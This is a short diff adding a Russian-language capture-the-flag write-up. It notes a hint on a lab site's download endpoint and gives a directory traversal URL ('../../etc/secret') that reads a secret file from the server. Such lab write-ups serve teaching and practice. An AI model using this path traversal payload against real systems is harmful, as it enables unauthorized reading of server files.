@@ -1,0 +1,2 @@
+На сайте можно найти подсказку (http://192.168.12.10:5001/download?file_type=file1.txt), в которой говорится, что флаг находится etc/secret.
+Для скачивания файла из /etc/secret нужно использовать directory traversal: http://192.168.12.10:5001/download?file_type=../../etc/secret
